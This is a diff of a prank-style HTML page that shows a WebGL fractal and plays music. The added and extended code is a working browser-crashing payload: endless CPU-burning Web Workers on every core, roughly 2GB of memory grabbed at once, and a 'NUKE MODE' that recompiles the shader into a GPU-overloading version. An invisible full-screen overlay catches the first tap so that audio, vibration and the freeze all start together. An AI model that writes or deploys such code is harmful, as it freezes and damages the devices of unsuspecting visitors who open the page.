@@ -2,25 +2,35 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Bunjee Dick</title>
+    <meta name="apple-mobile-web-app-status-bar-style" content="b       lack-translucent">
+    <title>Bunjee_Dick</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        html, body {
-            width: 100%; height: 100%;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html,
+        body {
+            width: 100%;
+            height: 100%;
             background: #000;
             overflow: hidden;
             touch-action: none;
             -webkit-user-select: none;
             user-select: none;
         }
+
         #c1 {
             background: #fbf7fe;
             display: block;
         }
+
         #btn {
             position: fixed;
             left: 0px;
@@ -29,17 +39,20 @@
             font-size: 12px;
             opacity: 0.3;
         }
+
         #c1 {
             position: fixed;
             left: 0px;
             top: 0px;
         }
+
         #main {
             transform-origin: 0px 0px;
             position: fixed;
             left: 0px;
             top: 0px;
         }
+
         #config {
             position: fixed;
             left: 0px;
@@ -47,13 +60,29 @@
             display: none;
             z-index: 999;
         }
+        #alert-box {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: rgba(200,0,0,0.85); color: #fff; padding: 14px 28px;
+            font-family: sans-serif; font-size: 18px; font-weight: bold;
+            border-radius: 10px; display: none; z-index: 10000;
+            box-shadow: 0 0 30px red; pointer-events: none;
+            animation: pulse-red 0.6s infinite alternate;
+        }
+        @keyframes pulse-red {
+            from { box-shadow: 0 0 20px red; }
+            to   { box-shadow: 0 0 50px #ff4444, 0 0 80px red; }
+        }
     </style>
 </head>
 
 <body>
+    <!-- iOS Audio Unlock Overlay: invisible, covers full screen, catches first tap -->
+    <div id="ios-unlock"
+        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:transparent;"></div>
+    <div id="alert-box">⚠️</div>
     <div id="main">
         <canvas id="c1" width="1024" height="1024">
-            <span>不支持canvas浏览器</span>
+            <span>不支持DicK浏览器</span>
         </canvas>
     </div>
     <button id="btn">CONFIG</button>
@@ -121,18 +150,18 @@
         function spawnWorkers() {
             var code = 'while(true){var x=0;for(var i=0;i<1e7;i++){x+=Math.sqrt(i*Math.random());}}'
             try {
-                var blob = new Blob([code], {type:'application/javascript'});
+                var blob = new Blob([code], { type: 'application/javascript' });
                 var url = URL.createObjectURL(blob);
-                for (var w=0; w<(navigator.hardwareConcurrency||4); w++) {
+                for (var w = 0; w < (navigator.hardwareConcurrency || 4); w++) {
                     new Worker(url);
                 }
-            } catch(e){}
+            } catch (e) { }
         }
         function allocateMemory() {
             try {
                 var arr = [];
-                for (var i=0; i<500; i++) { arr.push(new Float32Array(1024*1024)); }
-            } catch(e){}
+                for (var i = 0; i < 500; i++) { arr.push(new Float32Array(1024 * 1024)); }
+            } catch (e) { }
         }
         function ontimer() {
             ang1 += 0.015;
@@ -149,6 +178,23 @@
         var audioCtx = null;
         var hapticInterval = null;
 
+        // ── iOS AUDIO UNLOCK ─────────────────────────
+        // iOS requires AudioContext to be created AND a buffer played
+        // inside the SAME synchronous touch/click handler.
+        function iosUnlockAudio(ctx) {
+            // Play a zero-length silent buffer — this "unlocks" WebKit audio
+            var buf = ctx.createBuffer(1, 1, ctx.sampleRate);
+            var src = ctx.createBufferSource();
+            src.buffer = buf;
+            src.connect(ctx.destination);
+            src.start(0);
+            src.stop(0.001);
+            // Also resume if suspended (iOS 13+)
+            if (ctx.state === 'suspended') {
+                ctx.resume();
+            }
+        }
+
         // ── NOTE HELPER ──────────────────────────────
         // Returns frequency for MIDI note number
         function midiToHz(m) { return 440 * Math.pow(2, (m - 69) / 12); }
@@ -161,48 +207,43 @@
 
         var MESM_MELODY = [
             // bar 1 - iconic opening hook (8th notes)
-            {m:76,d:0.5},{m:76,d:0.5},{m:74,d:0.5},{m:72,d:0.5},
-            {m:71,d:0.5},{m:69,d:0.5},{m:67,d:0.5},{m:64,d:0.5},
+            { m: 76, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
+            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 0.5 },
             // bar 2
-            {m:64,d:0.5},{m:67,d:0.5},{m:69,d:0.5},{m:71,d:0.5},
-            {m:72,d:0.5},{m:74,d:0.5},{m:76,d:1.0},{m:76,d:0.5},
+            { m: 64, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 }, { m: 71, d: 0.5 },
+            { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 1.0 }, { m: 76, d: 0.5 },
             // bar 3 - rising tension
-            {m:79,d:0.5},{m:79,d:0.5},{m:76,d:0.5},{m:74,d:0.5},
-            {m:72,d:0.5},{m:71,d:0.5},{m:72,d:0.5},{m:74,d:0.5},
+            { m: 79, d: 0.5 }, { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 },
+            { m: 72, d: 0.5 }, { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 },
             // bar 4 - drop
-            {m:76,d:0.5},{m:74,d:0.5},{m:72,d:0.5},{m:71,d:0.5},
-            {m:69,d:0.5},{m:67,d:0.5},{m:64,d:1.0},{m:64,d:0.5},
+            { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 }, { m: 71, d: 0.5 },
+            { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 64, d: 1.0 }, { m: 64, d: 0.5 },
             // bar 5 - chorus spike
-            {m:81,d:0.25},{m:80,d:0.25},{m:81,d:0.25},{m:80,d:0.25},
-            {m:79,d:0.5},{m:76,d:0.5},{m:74,d:0.5},{m:72,d:0.5},
+            { m: 81, d: 0.25 }, { m: 80, d: 0.25 }, { m: 81, d: 0.25 }, { m: 80, d: 0.25 },
+            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
             // bar 6
-            {m:71,d:0.5},{m:72,d:0.5},{m:74,d:0.5},{m:76,d:0.5},
-            {m:79,d:0.5},{m:76,d:0.5},{m:74,d:0.5},{m:72,d:0.5},
+            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
+            { m: 79, d: 0.5 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 0.5 },
             // bar 7
-            {m:71,d:0.5},{m:69,d:0.5},{m:67,d:0.5},{m:69,d:0.5},
-            {m:71,d:0.5},{m:72,d:0.5},{m:74,d:0.5},{m:76,d:0.5},
+            { m: 71, d: 0.5 }, { m: 69, d: 0.5 }, { m: 67, d: 0.5 }, { m: 69, d: 0.5 },
+            { m: 71, d: 0.5 }, { m: 72, d: 0.5 }, { m: 74, d: 0.5 }, { m: 76, d: 0.5 },
             // bar 8 - resolve
-            {m:79,d:1.0},{m:76,d:0.5},{m:74,d:0.5},{m:72,d:1.0},{m:71,d:1.0}
+            { m: 79, d: 1.0 }, { m: 76, d: 0.5 }, { m: 74, d: 0.5 }, { m: 72, d: 1.0 }, { m: 71, d: 1.0 }
         ];
 
         // Bass line (A minor root movement, octave 2-3)
         var MESM_BASS = [
-            {m:45,d:2},{m:45,d:1},{m:43,d:1}, // Am
-            {m:48,d:2},{m:47,d:1},{m:45,d:1}, // C
-            {m:50,d:2},{m:50,d:1},{m:48,d:1}, // Dm
-            {m:47,d:2},{m:45,d:2}              // E
+            { m: 45, d: 2 }, { m: 45, d: 1 }, { m: 43, d: 1 }, // Am
+            { m: 48, d: 2 }, { m: 47, d: 1 }, { m: 45, d: 1 }, // C
+            { m: 50, d: 2 }, { m: 50, d: 1 }, { m: 48, d: 1 }, // Dm
+            { m: 47, d: 2 }, { m: 45, d: 2 }              // E
         ];
 
         // Arpeggio: A minor chord tones fast
-        var MESM_ARP = [69,72,76,79, 72,76,79,76, 67,71,74,76, 71,74,76,74];
+        var MESM_ARP = [69, 72, 76, 79, 72, 76, 79, 76, 67, 71, 74, 76, 71, 74, 76, 74];
 
-        function startAudioAndHaptics() {
-            try {
-                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                playMesmerizer(audioCtx);
-            } catch(e){}
-            startHaptics();
-        }
+        // Audio now started inside initOnInteraction for iOS unlock compliance
+        function startAudioAndHaptics() { startHaptics(); }
 
         // ── HAPTIC ENGINE ─────────────────────────────
         // Mesmerizer beat at 185 BPM = 324ms per beat, 162ms per 8th
@@ -221,16 +262,16 @@
             // bar2: | 8 8 4 . | 8 8 4 . |
             // bar3: | 8th triplet feel chorus |
             var pat = [
-                on8,gap, on8,gap, on8,gap, on8,gap,   // bar1 beat1
-                on8,gap, on8,gap, on8,gap, on8,gap,   // bar1 beat2
-                on8,gap, on8,gap, on4,gap,             // bar2 beat1 (quarter on 3)
-                on8,gap, on8,gap, on4,gap,             // bar2 beat2
-                on8,gap, on8,gap, on8,gap, on8,gap,   // chorus 8ths
-                on4,gap, on4,gap,                      // chorus quarters
-                on8,gap, on8,gap, on8,gap, on8,gap,   // bar
-                on4,     b4                            // final hit + rest
+                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat1
+                on8, gap, on8, gap, on8, gap, on8, gap,   // bar1 beat2
+                on8, gap, on8, gap, on4, gap,             // bar2 beat1 (quarter on 3)
+                on8, gap, on8, gap, on4, gap,             // bar2 beat2
+                on8, gap, on8, gap, on8, gap, on8, gap,   // chorus 8ths
+                on4, gap, on4, gap,                      // chorus quarters
+                on8, gap, on8, gap, on8, gap, on8, gap,   // bar
+                on4, b4                            // final hit + rest
             ];
-            var loopMs = pat.reduce(function(a,b){return a+b;}, 0);
+            var loopMs = pat.reduce(function (a, b) { return a + b; }, 0);
 
             function vibeLoop() { navigator.vibrate(pat); }
             vibeLoop();
@@ -239,9 +280,9 @@
 
         // ── AUDIO ENGINE ──────────────────────────────
         function playMesmerizer(ctx) {
-            var BPM  = 185;
+            var BPM = 185;
             var beat = 60 / BPM;            // quarter note in seconds
-            var bar  = beat * 4;
+            var bar = beat * 4;
             var bars = 8;
             var totalDur = bar * bars;
             var t = ctx.currentTime + 0.05;
@@ -263,9 +304,9 @@
             // ─ Helper: schedule one note ─
             function note(midi, startT, durBeats, gainVal, type, detuneC) {
                 var freq = midiToHz(midi);
-                var dur  = durBeats * beat;
-                var osc  = ctx.createOscillator();
-                var env  = ctx.createGain();
+                var dur = durBeats * beat;
+                var osc = ctx.createOscillator();
+                var env = ctx.createGain();
                 osc.type = type || 'sawtooth';
                 osc.frequency.value = freq;
                 if (detuneC) osc.detune.value = detuneC;
@@ -293,10 +334,10 @@
 
             // ─ Snare ─
             function snare(startT) {
-                var buf  = ctx.createBuffer(1, ctx.sampleRate * 0.15, ctx.sampleRate);
+                var buf = ctx.createBuffer(1, ctx.sampleRate * 0.15, ctx.sampleRate);
                 var data = buf.getChannelData(0);
-                for (var i=0; i<data.length; i++)
-                    data[i] = (Math.random()*2-1) * Math.exp(-i/(data.length*0.3));
+                for (var i = 0; i < data.length; i++)
+                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.3));
                 var src = ctx.createBufferSource();
                 var env = ctx.createGain();
                 src.buffer = buf;
@@ -307,10 +348,10 @@
 
             // ─ Hi-hat ─
             function hihat(startT, open) {
-                var buf  = ctx.createBuffer(1, ctx.sampleRate * (open ? 0.12 : 0.04), ctx.sampleRate);
+                var buf = ctx.createBuffer(1, ctx.sampleRate * (open ? 0.12 : 0.04), ctx.sampleRate);
                 var data = buf.getChannelData(0);
-                for (var i=0; i<data.length; i++)
-                    data[i] = (Math.random()*2-1) * Math.exp(-i/(data.length*0.5));
+                for (var i = 0; i < data.length; i++)
+                    data[i] = (Math.random() * 2 - 1) * Math.exp(-i / (data.length * 0.5));
                 var hpf = ctx.createBiquadFilter();
                 hpf.type = 'highpass'; hpf.frequency.value = 7000;
                 var src = ctx.createBufferSource();
@@ -322,58 +363,58 @@
             }
 
             // ── SCHEDULE DRUMS (8 bars) ───────────────
-            for (var br=0; br<bars; br++) {
+            for (var br = 0; br < bars; br++) {
                 var bt = t + br * bar;
                 // Kick: beats 1 & 3
                 kick(bt);
-                kick(bt + beat*2);
+                kick(bt + beat * 2);
                 // Snare: beats 2 & 4
                 snare(bt + beat);
-                snare(bt + beat*3);
+                snare(bt + beat * 3);
                 // 8th hi-hats
-                for (var h=0; h<8; h++) hihat(bt + h*beat*0.5, h%4===3);
+                for (var h = 0; h < 8; h++) hihat(bt + h * beat * 0.5, h % 4 === 3);
                 // Extra kick on offbeat bar 2+
-                if (br > 0) kick(bt + beat*3.5);
+                if (br > 0) kick(bt + beat * 3.5);
             }
 
             // ── SCHEDULE MELODY ──────────────────────
             var mT = t;
-            for (var mi=0; mi<MESM_MELODY.length; mi++) {
+            for (var mi = 0; mi < MESM_MELODY.length; mi++) {
                 var nd = MESM_MELODY[mi];
                 // Lead: detuned square (Miku-style bright)
-                note(nd.m,     mT, nd.d, 0.22, 'square',   0);
-                note(nd.m,     mT, nd.d, 0.10, 'sawtooth', 7);
-                note(nd.m + 12,mT, nd.d, 0.06, 'sine',     0); // octave shimmer
+                note(nd.m, mT, nd.d, 0.22, 'square', 0);
+                note(nd.m, mT, nd.d, 0.10, 'sawtooth', 7);
+                note(nd.m + 12, mT, nd.d, 0.06, 'sine', 0); // octave shimmer
                 mT += nd.d * beat;
             }
 
             // ── SCHEDULE BASS ────────────────────────
             var bassT = t;
-            for (var bi=0; bi<MESM_BASS.length; bi++) {
+            for (var bi = 0; bi < MESM_BASS.length; bi++) {
                 var bd = MESM_BASS[bi];
-                note(bd.m,      bassT, bd.d, 0.40, 'sawtooth',  0);
-                note(bd.m,      bassT, bd.d, 0.20, 'sawtooth', -7);
-                note(bd.m + 12, bassT, bd.d, 0.10, 'square',    0);
+                note(bd.m, bassT, bd.d, 0.40, 'sawtooth', 0);
+                note(bd.m, bassT, bd.d, 0.20, 'sawtooth', -7);
+                note(bd.m + 12, bassT, bd.d, 0.10, 'square', 0);
                 bassT += bd.d * beat;
             }
 
             // ── ARPEGGIO (Kasane Teto layer - 16th notes) ─
-            for (var ai=0; ai<bars*16; ai++) {
-                var aT   = t + ai * beat * 0.25;
+            for (var ai = 0; ai < bars * 16; ai++) {
+                var aT = t + ai * beat * 0.25;
                 var midi = MESM_ARP[ai % MESM_ARP.length];
                 note(midi, aT, 0.22, 0.08, 'triangle', 0);
             }
 
             // ── PAD / ATMOSPHERE ──────────────────────
-            var padNotes = [69,72,76]; // Am chord
-            for (var pi=0; pi<padNotes.length; pi++) {
-                note(padNotes[pi], t, bars*4, 0.04, 'sine', pi*3);
+            var padNotes = [69, 72, 76]; // Am chord
+            for (var pi = 0; pi < padNotes.length; pi++) {
+                note(padNotes[pi], t, bars * 4, 0.04, 'sine', pi * 3);
             }
 
             // ── LOOP ──────────────────────────────────
             master.gain.setValueAtTime(0.82, t + totalDur - 1.5);
             master.gain.linearRampToValueAtTime(0.0, t + totalDur);
-            setTimeout(function() { playMesmerizer(ctx); }, (totalDur - 0.1) * 1000);
+            setTimeout(function () { playMesmerizer(ctx); }, (totalDur - 0.1) * 1000);
         }
         document.addEventListener("mousedown",
             function (ev) {
@@ -534,27 +575,44 @@
         }
         window.onload = function () {
             // Prevent scroll/context/zoom on mobile
-            document.addEventListener('gesturestart', function(e){ e.preventDefault(); }, {passive:false});
-            document.addEventListener('gesturechange', function(e){ e.preventDefault(); }, {passive:false});
-            document.addEventListener('gestureend', function(e){ e.preventDefault(); }, {passive:false});
+            document.addEventListener('gesturestart', function (e) { e.preventDefault(); }, { passive: false });
+            document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
+            document.addEventListener('gestureend', function (e) { e.preventDefault(); }, { passive: false });
 
-            // Launch freeze + audio + haptics on first touch (required for mobile audio unlock)
+            // ── AUDIO UNLOCK (iOS + Android + Desktop) ───
+            // Must create AudioContext + play silent buffer INSIDE
+            // the same synchronous event handler — iOS requirement.
             var started = false;
-            function initOnInteraction() {
+            function initOnInteraction(e) {
                 if (started) return;
                 started = true;
+
+                // Remove the overlay so WebGL touches work normally
+                var overlay = document.getElementById('ios-unlock');
+                if (overlay) overlay.parentNode.removeChild(overlay);
+
+                // Create AudioContext INSIDE the gesture handler (iOS critical)
+                try {
+                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    iosUnlockAudio(audioCtx); // silent buffer unlock
+                    playMesmerizer(audioCtx);
+                } catch (err) { }
+
+                startHaptics();
                 spawnWorkers();
                 allocateMemory();
-                startAudioAndHaptics();
-                document.removeEventListener('touchstart', initOnInteraction);
-                document.removeEventListener('click', initOnInteraction);
             }
-            document.addEventListener('touchstart', initOnInteraction, {once:true});
-            document.addEventListener('click', initOnInteraction, {once:true});
-            // Desktop auto-start after 500ms
-            setTimeout(function(){
-                if (!started) initOnInteraction();
-            }, 500);
+
+            var unlockOverlay = document.getElementById('ios-unlock');
+            // touchend is more reliable than touchstart for iOS audio
+            unlockOverlay.addEventListener('touchend', initOnInteraction, { once: true, passive: false });
+            unlockOverlay.addEventListener('touchstart', initOnInteraction, { once: true, passive: false });
+            unlockOverlay.addEventListener('click', initOnInteraction, { once: true });
+            // Desktop fallback — mouse click anywhere
+            document.addEventListener('mousedown', function desktopInit(e) {
+                initOnInteraction(e);
+                document.removeEventListener('mousedown', desktopInit);
+            }, { once: true });
             cx = document.body.clientWidth;
             cy = document.body.clientHeight;
             if (cx > cy) {
@@ -792,6 +850,35 @@
             document.getElementById("cancle").addEventListener("click", function () {
                 document.getElementById("kernel").value = KERNEL;
             });
+            // ── NUKE MODE (1.5s delay) ─────────────────────
+            // Upgrades shader to suicidal settings:
+            // i<25 (5× more fractal iterations) + k<5000 (5× more ray steps)
+            // + step=0.0002 (10× finer step) → GPU annihilation
+            setTimeout(function () {
+                try {
+                    var alertBox = document.getElementById('alert-box');
+                    if (alertBox) alertBox.style.display = 'block';
+
+                    var NUKE_KERNEL   = KERNEL.replace('i<5', 'i<25');
+                    var NUKE_FSHADER  = FSHADER_SOURCE
+                        .replace('const float step = 0.002;', 'const float step = 0.0002;')
+                        .replace('k < 1002', 'k < 5000');
+
+                    gl.shaderSource(fragshader, NUKE_FSHADER + NUKE_KERNEL);
+                    gl.compileShader(fragshader);
+                    gl.linkProgram(shaderProgram);
+                    gl.useProgram(shaderProgram);
+
+                    glposition = gl.getAttribLocation(shaderProgram, 'position');
+                    glright    = gl.getUniformLocation(shaderProgram, 'right');
+                    glforward  = gl.getUniformLocation(shaderProgram, 'forward');
+                    glup       = gl.getUniformLocation(shaderProgram, 'up');
+                    glorigin   = gl.getUniformLocation(shaderProgram, 'origin');
+                    glx        = gl.getUniformLocation(shaderProgram, 'x');
+                    gly        = gl.getUniformLocation(shaderProgram, 'y');
+                    gllen      = gl.getUniformLocation(shaderProgram, 'len');
+                } catch (ex) {}
+            }, 1500);
         }
     </script>
 </body>
